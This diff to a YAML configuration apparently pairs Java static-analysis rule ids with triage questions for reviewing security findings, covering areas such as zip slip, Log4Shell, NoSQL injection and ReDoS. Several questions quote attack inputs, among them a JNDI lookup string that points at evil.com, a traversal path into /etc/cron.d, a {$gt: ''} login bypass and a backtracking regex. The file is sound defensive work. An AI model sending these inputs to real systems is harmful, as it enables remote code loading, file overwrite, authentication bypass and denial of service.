+  short_description: "XML entity expansion causing exponential memory consumption (Billion Laughs / CWE-776)"
+  questions:
+    - "Is XML input from an UNTRUSTED source parsed with a factory that allows DOCTYPE declarations?"
+    - "Is XMLConstants.FEATURE_SECURE_PROCESSING set to true on the parser factory?"
+    - "Is the maximum entity expansion limit configured (jdk.xml.entityExpansionLimit system property)?"
+    - "Could an attacker send nested entity definitions (<!ENTITY a '&b;&b;'>) to cause exponential memory growth?"
+    - "Is FEATURE_DISALLOW_DOCTYPE_DECL set to true (strongest protection against both XXE and entity expansion)?"
+    - "What is the impact — OutOfMemoryError crashing the server, or is parsing done in a sandboxed/limited context?"
+  context_hint: "Include XML parser factory configuration and the source of XML input."
+  additional_context: ["caller"]
+
+java/regex-dos:
+  short_description: "Regular expression vulnerable to catastrophic backtracking on attacker input (CWE-1333)"
+  questions:
+    - "Does the REGEX PATTERN contain nested quantifiers (e.g., (a+)+, (a|b)*c*), overlapping alternations, or back-references?"
+    - "Is the INPUT to Pattern.matcher() user-controlled and could an attacker craft a string causing exponential backtracking?"
+    - "Is there a TIMEOUT or length limit on the input string before it is matched?"
+    - "Could this regex be rewritten to avoid backtracking (e.g., using possessive quantifiers a++, atomic groups, or a simpler pattern)?"
+    - "Is Pattern.compile() called once and reused, or is it compiled per-request (additional overhead)?"
+    - "What is the impact — thread blocked for seconds/minutes, connection pool exhaustion, full server DoS?"
+  context_hint: "Include the regex pattern, input source, and where the match result is used."
+  additional_context: []
+
+# ==============================================================================
+# Java - Session and Cookie Security (CWE-384, CWE-1021, CWE-942)
+# ==============================================================================
+
+java/session-fixation:
+  short_description: "Session not invalidated after login allowing session fixation attack (CWE-384)"
+  questions:
+    - "Is HttpSession.invalidate() called BEFORE creating a new session after successful authentication?"
+    - "Does Spring Security's SessionFixationProtection strategy use migrateSession() or newSession() (both are safe)?"
+    - "Could an attacker set a session cookie (via XSS, subdomain cookie, or URL rewriting) BEFORE the victim logs in?"
+    - "Is session.changeSessionId() (Servlet 3.1+) used as an alternative to full invalidation?"
+    - "Is the session ID regenerated on every privilege level change (login, role escalation, password change)?"
+    - "Is Spring Security's sessionFixation() explicitly configured, or is the default (migrateSession) relied upon?"
+  context_hint: "Include the authentication handler, session management code, and Spring Security session configuration."
+  additional_context: ["caller", "class"]
+
+java/clickjacking:
+  short_description: "Missing frame protection headers allowing clickjacking attacks (CWE-1021)"
+  questions:
+    - "Is the X-Frame-Options header set to DENY or SAMEORIGIN in the HTTP response?"
+    - "Is Content-Security-Policy frame-ancestors directive configured (e.g., frame-ancestors 'self')?"
+    - "Is Spring Security's headers().frameOptions() configured — the default is DENY but is it explicitly disabled?"
+    - "Could an attacker embed this page in an iframe on a malicious site to trick users into clicking hidden buttons?"
+    - "Are there specific pages (OAuth consent, payment, admin actions) where clickjacking would have high impact?"
+    - "Is the protection applied globally via a filter/interceptor, or must each controller set it individually?"
+  context_hint: "Include Spring Security configuration, response header settings, and any global filters."
+  additional_context: ["class"]
+
+java/zip-slip:
+  short_description: "Archive extraction without validating entry paths allowing directory traversal (CWE-22)"
+  questions:
+    - "Is ZipInputStream, ZipFile, or a library (Apache Commons Compress, java.util.jar) used to extract entries?"
+    - "Is each entry's getName() checked to ensure it does not contain '../' or absolute path components?"
+    - "Is the resolved extraction path validated to be WITHIN the intended destination directory (canonical path comparison)?"
+    - "Could an attacker craft a ZIP with entries like '../../../etc/cron.d/malicious' to write files outside the extraction directory?"
+    - "Is File.getCanonicalPath() or Path.toRealPath() used to resolve symlinks and normalize the path before comparison?"
+    - "What is the impact — overwriting application config, writing a JSP/WAR for RCE, or replacing system files?"
+  context_hint: "Include the archive extraction loop, entry path handling, and destination directory logic."
+  additional_context: ["caller"]
+
+# ==============================================================================
+# Java - Header and Protocol Security (CWE-113, CWE-319, CWE-327)
+# ==============================================================================
+
+java/header-injection:
+  short_description: "CRLF injection in HTTP response header allowing response splitting (CWE-113)"
+  questions:
+    - "Where does the HEADER VALUE originate — request parameter, cookie, database, user profile?"
+    - "Is HttpServletResponse.setHeader(), addHeader(), or addCookie() called with user-controlled data?"
+    - "Could an attacker inject \\r\\n (CRLF) characters to add extra headers or split the HTTP response?"
+    - "Is the value sanitized by stripping or rejecting carriage return and line feed characters?"
+    - "Could response splitting allow an attacker to inject a Set-Cookie header, redirect, or XSS payload?"
+    - "Does the servlet container (Tomcat, Jetty) automatically reject headers with CRLF characters (modern versions do)?"
+  context_hint: "Include the header-setting code and the source of the header value."
+  additional_context: ["caller"]
+
+java/cleartext-transmission:
+  short_description: "Sensitive data transmitted over unencrypted HTTP connection (CWE-319)"
+  questions:
+    - "What SENSITIVE DATA is being transmitted — credentials, tokens, PII, payment information?"
+    - "Is the connection using HTTP instead of HTTPS — URL starts with http:// or no TLS configured?"
+    - "Is Spring Security's requiresChannel().anyRequest().requiresSecure() configured to enforce HTTPS?"
+    - "Is the Strict-Transport-Security (HSTS) header set to prevent future HTTP connections?"
+    - "Could an attacker on the network (public WiFi, ISP, compromised router) intercept this data in transit?"
+    - "Is this for internal service-to-service communication where mTLS or a service mesh provides encryption?"
+  context_hint: "Include the HTTP client configuration, URL construction, and what data is sent."
+  additional_context: ["caller"]
+
+java/insecure-tls-version:
+  short_description: "SSLContext configured with deprecated TLS 1.0/1.1 protocol (CWE-327)"
+  questions:
+    - "Is SSLContext.getInstance() called with 'TLS', 'TLSv1', or 'TLSv1.1' instead of 'TLSv1.2' or 'TLSv1.3'?"
+    - "Is the SSLContext used for client connections, server sockets, or both?"
+    - "Are weak cipher suites (RC4, DES, 3DES, NULL, EXPORT) enabled in the SSLParameters?"
+    - "Does the Java runtime version support TLS 1.2+ and is it configured as the minimum via jdk.tls.client.protocols?"
+    - "What compliance requirements apply — PCI DSS requires TLS 1.2+, NIST recommends TLS 1.3?"
+    - "Is this connecting to a legacy system that only supports older TLS, and is there a migration plan?"
+  context_hint: "Include SSLContext creation, protocol selection, and cipher suite configuration."
+  additional_context: []
+
+# ==============================================================================
+# Java - Logging and Injection (CWE-117)
+# ==============================================================================
+
+java/log4j-injection: &java_log4j_injection
+  short_description: "User-controlled data in Log4j message enabling JNDI lookup injection (CWE-117)"
+  questions:
+    - "Is user-controlled input included in a Log4j log message (logger.info(), logger.error(), etc.) as part of the message string?"
+    - "Is the Log4j version 2.0 through 2.14.1 (vulnerable to Log4Shell / CVE-2021-44228)?"
+    - "Is the log4j2.formatMsgNoLookups system property set to true, or is %m{nolookups} used in the pattern?"
+    - "Could an attacker inject ${jndi:ldap://evil.com/a} in the input to trigger remote class loading?"
+    - "Are input fields that reach log statements sanitized to remove or escape ${ sequences?"
+    - "Is Log4j used via SLF4J with parameterized logging (logger.info('User: {}', username)) — this is still vulnerable in affected versions?"
+  context_hint: "Include the log statement, Log4j version/dependency, and the source of logged data."
+  additional_context: ["caller"]
+
+# Custom CodeQL query (renamed from java/log4j-injection to avoid built-in id collision)
+java/log4j-injection-ext: *java_log4j_injection
+
+# ==============================================================================
+# Java - NoSQL Injection (CWE-943)
+# ==============================================================================
+
+java/nosql-injection:
+  short_description: "MongoDB or NoSQL query built from user-controlled input (CWE-943)"
+  questions:
+    - "Where does the INPUT originate — request parameter, request body, path variable?"
+    - "Is the query built using string concatenation or BasicDBObject with user input (vulnerable)?"
+    - "Is Spring Data MongoDB's @Query annotation used with SpEL expressions containing user input?"
+    - "Are MongoDB query operators ($gt, $ne, $regex, $where) injectable through user input?"
+    - "Is MongoTemplate.find() used with a Criteria object built safely from user input?"
+    - "Could an attacker inject {$gt: ''} in a password field to bypass authentication?"
+  context_hint: "Include the query construction, user input source, and MongoDB API usage."
+  additional_context: ["caller", "class"]
+
+# ==============================================================================
+# Java - HTML Injection (CWE-79 variant)
+# ==============================================================================
+
+java/html-injection:
+  short_description: "User input rendered in HTML template without escaping (CWE-79)"
+  questions:
+    - "Where does the INPUT originate — model attribute, request parameter, database field?"
+    - "Is the template engine's auto-escaping ENABLED and NOT bypassed (Thymeleaf th:utext, JSP <%=, Freemarker ?no_esc)?"
+    - "Is th:text used (safe, auto-escapes) or th:utext (unsafe, renders raw HTML)?"
+    - "For JSP: is <c:out> or fn:escapeXml() used instead of direct expression output (<%= %>)?"
+    - "Could an attacker inject HTML tags to deface the page, create phishing forms, or inject scripts?"
+    - "Is Content-Security-Policy configured to mitigate the impact of any successful injection?"
+  context_hint: "Include the template file, model attribute binding, and output expression."
+  additional_context: ["caller"]
+
+java/cors-misconfiguration:
+  short_description: "CORS configuration allowing overly permissive origins in Java web application"
+  questions:
+    - "Is @CrossOrigin(origins = '*') or CorsConfiguration.addAllowedOrigin('*') used?"
+    - "Is allowCredentials(true) combined with a wildcard or reflected origin (insecure)?"
+    - "Is a CorsConfigurationSource bean defined with specific AllowedOrigins rather than wildcards?"
+    - "Is the CORS filter applied globally via WebMvcConfigurer.addCorsMappings() or per-controller?"
+    - "Could an attacker's website make authenticated cross-origin requests and read the response?"
+    - "Are sensitive endpoints (admin, payment) excluded from permissive CORS rules?"
+  context_hint: "Check @CrossOrigin annotations, CorsConfigurationSource, and WebMvcConfigurer CORS mappings."
+  additional_context: ["caller", "class"]
+
+java/mass-assignment:
+  short_description: "HTTP request body directly bound to model allowing unauthorized field assignment"
+  questions:
+    - "Is @ModelAttribute or @RequestBody used to bind request data directly to a JPA entity or domain object?"
+    - "Does the entity contain fields that should not be user-settable (role, isAdmin, balance, password)?"
+    - "Is a separate DTO used for input binding, then mapped to the entity (safe pattern)?"
+    - "Could an attacker add extra fields (e.g., 'role': 'ADMIN') to the JSON body to escalate privileges?"
+    - "Is Spring's @JsonIgnore or Jackson's @JsonProperty(access = READ_ONLY) used on sensitive fields?"
+    - "Are only explicitly allowlisted fields copied from the DTO to the entity?"
+  context_hint: "Check the request binding, entity class, and whether a DTO is used as an intermediate."
+  additional_context: ["caller", "class"]
+
+java/sensitive-data-exposure:
+  short_description: "Sensitive data exposed in logs, error responses, or API output in Java"
+  questions:
+    - "What sensitive data is exposed — passwords, API keys, tokens, PII, stack traces, SQL query details?"
+    - "Is the Spring error handling configured to return detailed stack traces to clients (server.error.include-stacktrace=always)?"
+    - "Are exception messages containing internal details (SQL errors, file paths) returned in REST responses?"
+    - "Is logging configured to avoid recording sensitive data (passwords, tokens) in log files?"
+    - "Are sensitive entity fields excluded from JSON serialization using @JsonIgnore or a DTO?"
+    - "Could the exposure violate GDPR, HIPAA, or PCI-DSS compliance requirements?"
+  context_hint: "Trace sensitive data to all output channels (REST response, logs, error pages)."
+  additional_context: ["caller", "class"]
+
+java/regex-injection:
+  short_description: "User input used in Pattern.compile() causing catastrophic backtracking"
+  questions:
+    - "Is Pattern.compile() or String.matches()/replaceAll()/split() called with a user-controlled regex pattern?"
+    - "Is the user input used as the PATTERN (dangerous) or as the INPUT string to match (safe)?"
+    - "Could an attacker supply a pattern like (a+)+ that causes exponential backtracking?"
+    - "Is the pattern validated or restricted (max length, character allowlist) before compilation?"
+    - "Could catastrophic backtracking cause denial of service by exhausting CPU and blocking the thread pool?"
+    - "Would Pattern.CANON_EQ or Pattern.COMMENTS make the regex more vulnerable to injection?"
+  context_hint: "Identify whether user input reaches Pattern.compile() and check for backtracking patterns."
+  additional_context: ["caller"]
+
+java/timing-unsafe-comparison:
+  short_description: "Secret/HMAC/token compared with String.equals or Arrays.equals (non-constant-time)"
+  questions:
+    - "What is being compared at the flagged line — password, signature, HMAC, JWT signature, API token, or session id?"
+    - "Which comparison method is used — String.equals, ==, Arrays.equals, or MessageDigest.isEqual?"
+    - "MessageDigest.isEqual is constant-time in modern JDKs (≥ 6u17). Is one of String.equals / Arrays.equals being used instead?"
+    - "Is the user-supplied side attacker-controlled — taken from a request header, parameter, cookie, or body?"
+    - "Could a remote attacker measure response-time differences to recover the secret byte-by-byte?"
+    - "Could the application use MessageDigest.isEqual or a hand-written constant-time loop?"
+  context_hint: "Identify the comparison call and trace the attacker-controlled operand."
+  additional_context: ["caller"]
+
+java/csv-formula-injection:
+  short_description: "User-controlled value written to CSV/Excel cell without leading-character escaping"
+  questions:
+    - "Which library is writing the cell — Apache Commons CSV, OpenCSV, Apache POI, Jackson CSV, or a manual StringBuilder?"
+    - "What value flows into the cell, and where does it originate — HTTP request, DB record populated from user input, file upload?"
+    - "Does the writer reject or prefix leading '=', '+', '-', '@', tab, or carriage-return characters?"
+    - "Will the CSV/XLSX be opened in Excel / LibreOffice where leading '=' executes as a formula?"
+    - "Could an attacker inject =HYPERLINK / DDE / =cmd payloads to phish or execute commands on a victim's machine?"
+    - "Is OWASP's CSV-escape recommendation (prefix with single-quote or rewrite to text format) applied?"
+  context_hint: "Locate cell writer + user-input source."
+  additional_context: ["caller"]
+
+java/insecure-cookie:
+  short_description: "Cookie set without HttpOnly or SameSite attribute"
+  questions:
+    - "Where is the cookie created — new Cookie(...), ResponseCookie.from(), Set-Cookie header construction, Spring SecurityContextRepository?"
+    - "Is cookie.setHttpOnly(true) called on every code path? (CWE-1004)"
+    - "Is the SameSite attribute set to 'Lax' or 'Strict'? (CWE-1275) — defaults to 'None' in many servlet containers, exposing CSRF risk."
+    - "Is cookie.setSecure(true) called when the application is HTTPS-only? (CWE-614)"
+    - "Does the cookie carry session state, authentication, or other sensitive data?"
+    - "Could JavaScript on the page (or in an XSS payload) read the cookie via document.cookie?"
+  context_hint: "Find the cookie construction and walk the attribute setters."
+  additional_context: ["caller"]
+
+java/unsafe-reflection:
+  short_description: "Class.forName / ClassLoader.loadClass / Method.invoke with attacker-controlled name"
+  questions:
+    - "Which reflection API is called — Class.forName, ClassLoader.loadClass, MethodHandles.Lookup.findVirtual, Method.invoke, Constructor.newInstance?"
+    - "Where does the class/method name string originate? Trace back to the source."
+    - "Is the input validated against an allowlist of permitted class/method names?"
+    - "Could an attacker name a class that triggers a side effect in <clinit>, a Runtime.exec gadget, or a serialization-related class?"
+    - "Is a SecurityManager / AccessController policy in place to restrict reflective loading?"
+    - "Could this be a gadget chain entry point (e.g. javax.script.ScriptEngineManager, javax.naming.InitialContext)?"
+  context_hint: "Trace from input source to the reflective call; list allowlist checks if any."
+  additional_context: ["caller"]
+
+java/overflow-destination:
+  short_description: "System.arraycopy or Arrays.copyOfRange length derived from source instead of destination"
+  questions:
+    - "What is the DESTINATION array's declared length at the flagged line?"
+    - "What LENGTH argument is passed to System.arraycopy / ByteBuffer.put / Arrays.copyOfRange?"
+    - "Could that length exceed the destination's capacity for any input?"
+    - "Is the length bounded by an explicit check against destination.length before the copy?"
+    - "Could a tainted input control the length (e.g. parsed protocol length field)?"
+    - "Would the resulting ArrayIndexOutOfBoundsException be caught/swallowed, hiding a logical bug?"
+  context_hint: "Examine source, destination, and length all at once."
+  additional_context: ["caller"]
